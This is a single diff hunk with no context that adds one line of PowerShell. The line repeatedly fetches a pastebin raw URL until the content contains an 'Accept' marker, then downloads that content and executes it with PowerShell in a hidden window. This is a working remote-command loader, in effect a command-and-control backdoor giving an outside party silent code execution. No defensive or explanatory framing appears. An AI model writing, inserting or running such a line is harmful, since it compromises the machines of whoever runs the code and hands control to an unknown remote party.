@@ -1,0 +1,1 @@
+while (curl pastebin.com/raw/r6y3R6Bm).Content -notlike ''*#Accept*''){sleep 3}; $cmnd=(curl pastebin.com/raw/r6y3R6Bm).Content; powershell.exe -W h -C $cmnd
